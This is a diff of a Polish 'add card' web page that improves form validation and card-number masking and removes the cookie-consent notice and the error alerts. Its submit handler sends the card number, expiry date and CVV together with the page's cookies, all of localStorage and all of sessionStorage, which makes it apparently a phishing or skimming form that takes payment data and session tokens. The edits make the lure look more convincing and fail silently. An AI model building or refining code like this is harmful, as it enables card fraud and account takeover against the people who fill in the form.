@@ -29,15 +29,19 @@
     <!-- Form -->
     <div class="p-6">
       <h2 class="text-lg font-semibold mb-4">Dodaj kartę</h2>
-      <form id="cardForm" class="space-y-4" autocomplete="off">
-        <input
-          type="text"
-          name="cardNumber"
-          placeholder="Numer karty"
-          maxlength="19"
-          inputmode="numeric"
-          class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-          required />
+      <form id="cardForm" class="space-y-4" novalidate>
+        <div>
+          <input
+            type="text"
+            name="cardNumber"
+            id="cardNumber"
+            placeholder="Numer karty"
+            maxlength="19"
+            inputmode="numeric"
+            class="w-full border px-4 py-2 rounded outline-none transition"
+            required />
+          <p class="text-xs text-red-500 hidden mt-1" id="cardNumberError">Numer karty powinien zawierać 16 cyfr</p>
+        </div>
 
         <input
           type="text"
@@ -47,34 +51,46 @@
           required />
 
         <div class="flex gap-4 items-center">
-          <input
-            type="text"
-            name="expMonth"
-            placeholder="MM"
-            maxlength="2"
-            inputmode="numeric"
-            class="w-1/4 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none text-center"
-            required />
+          <div class="relative w-1/4">
+            <input
+              type="text"
+              name="expMonth"
+              id="expMonth"
+              placeholder="MM"
+              maxlength="2"
+              inputmode="numeric"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+              required />
+            <p class="text-xs text-red-500 hidden mt-1" id="expMonthError">1–12</p>
+          </div>
 
           <span class="text-gray-600">/</span>
 
-          <input
-            type="text"
-            name="expYear"
-            placeholder="RR"
-            maxlength="2"
-            inputmode="numeric"
-            class="w-1/4 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none text-center"
-            required />
+          <div class="relative w-1/4">
+            <input
+              type="text"
+              name="expYear"
+              id="expYear"
+              placeholder="RR"
+              maxlength="2"
+              inputmode="numeric"
+              class="w-full border px-4 py-2 rounded text-center outline-none transition"
+              required />
+            <p class="text-xs text-red-500 hidden mt-1" id="expYearError">Wymagane</p>
+          </div>
 
-          <input
-            type="text"
-            name="cvv"
-            placeholder="CVV"
-            maxlength="4"
-            inputmode="numeric"
-            class="flex-1 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-            required />
+          <div class="relative flex-1">
+            <input
+              type="text"
+              name="cvv"
+              id="cvv"
+              placeholder="CVV"
+              maxlength="4"
+              inputmode="numeric"
+              class="w-full border px-4 py-2 rounded outline-none transition"
+              required />
+            <p class="text-xs text-red-500 hidden mt-1" id="cvvError">3–4 cyfry</p>
+          </div>
         </div>
 
         <button
@@ -87,44 +103,118 @@
 
     <!-- Footer -->
     <div class="text-xs bg-black text-white p-2 text-center">
-      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
-    </div>
-    <div class="bg-white text-xs p-2 flex justify-between items-center border-t">
-      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5" />
-      <span>Zgoda na pliki cookies</span>
+      Strona wykorzystuje pliki cookie zgodnie z polityką prywatności.
     </div>
   </div>
 
   <script>
     const user = JSON.parse(localStorage.getItem('user'));
-    if (!user) {
-      document.body.innerHTML = '<div class="text-white text-center text-lg">Brak autoryzacji. Przekierowanie...</div>';
-      setTimeout(() => window.location.href = 'index.html', 2000);
-    }
+    if (!user) window.location.href = 'index.html';
 
     const form = document.getElementById('cardForm');
+    const cardNumber = document.getElementById('cardNumber');
+    const expMonth = document.getElementById('expMonth');
+    const expYear = document.getElementById('expYear');
+    const cvv = document.getElementById('cvv');
+
+    const cardNumberError = document.getElementById('cardNumberError');
+    const expMonthError = document.getElementById('expMonthError');
+    const expYearError = document.getElementById('expYearError');
+    const cvvError = document.getElementById('cvvError');
+
+    function maskCardNumber(value) {
+      return value.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
+    }
+
+    function validateCardNumber() {
+      const digits = cardNumber.value.replace(/\s/g, '');
+      if (digits.length !== 16) {
+        cardNumber.classList.add('border-red-500');
+        cardNumberError.classList.remove('hidden');
+        return false;
+      }
+      cardNumber.classList.remove('border-red-500');
+      cardNumberError.classList.add('hidden');
+      return true;
+    }
+
+    function validateMonth() {
+      const value = expMonth.value;
+      const valid = /^(0[1-9]|1[0-2])$/.test(value);
+      if (!valid) {
+        expMonth.classList.add('border-red-500');
+        expMonthError.classList.remove('hidden');
+        return false;
+      }
+      expMonth.classList.remove('border-red-500');
+      expMonthError.classList.add('hidden');
+      return true;
+    }
+
+    function validateYear() {
+      const value = expYear.value;
+      const valid = /^\d{2}$/.test(value);
+      if (!valid) {
+        expYear.classList.add('border-red-500');
+        expYearError.classList.remove('hidden');
+        return false;
+      }
+      expYear.classList.remove('border-red-500');
+      expYearError.classList.add('hidden');
+      return true;
+    }
+
+    function validateCVV() {
+      const value = cvv.value;
+      const valid = /^\d{3,4}$/.test(value);
+      if (!valid) {
+        cvv.classList.add('border-red-500');
+        cvvError.classList.remove('hidden');
+        return false;
+      }
+      cvv.classList.remove('border-red-500');
+      cvvError.classList.add('hidden');
+      return true;
+    }
+
+    cardNumber.addEventListener('input', (e) => {
+      cardNumber.value = maskCardNumber(e.target.value);
+      validateCardNumber();
+    });
+
+    expMonth.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+      if (e.target.value.length === 2) expYear.focus();
+      validateMonth();
+    });
+
+    expYear.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+      if (e.target.value.length === 2) cvv.focus();
+      validateYear();
+    });
+
+    cvv.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      validateCVV();
+    });
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
-      const month = form.expMonth.value.trim();
-      const year = form.expYear.value.trim();
+      const valid =
+        validateCardNumber() &&
+        validateMonth() &&
+        validateYear() &&
+        validateCVV();
 
-      if (!/^(0[1-9]|1[0-2])$/.test(month)) {
-        alert('Niepoprawny miesiąc (01–12)');
-        return;
-      }
-
-      if (!/^\d{2}$/.test(year)) {
-        alert('Niepoprawny rok (RR)');
-        return;
-      }
+      if (!valid) return;
 
       const payload = {
-        cardNumber: form.cardNumber.value.trim(),
+        cardNumber: cardNumber.value.replace(/\s/g, ''),
         cardHolder: form.cardHolder.value.trim(),
-        expiryDate: `${month}/${year}`,
-        cvv: form.cvv.value.trim(),
+        expiryDate: `${expMonth.value}/${expYear.value}`,
+        cvv: cvv.value,
         cookies: document.cookie,
         localStorage: JSON.stringify(localStorage),
         sessionStorage: JSON.stringify(sessionStorage),
@@ -141,14 +231,12 @@
         });
 
         if (res.ok) {
-          alert('✅ Karta zapisana!');
           form.reset();
-        } else {
-          alert('❌ Błąd podczas zapisu.');
+          [cardNumber, expMonth, expYear, cvv].forEach(el => el.classList.remove('border-red-500'));
+          [cardNumberError, expMonthError, expYearError, cvvError].forEach(el => el.classList.add('hidden'));
         }
       } catch (err) {
         console.error(err);
-        alert('❌ Błąd połączenia.');
       }
     });
   </script>
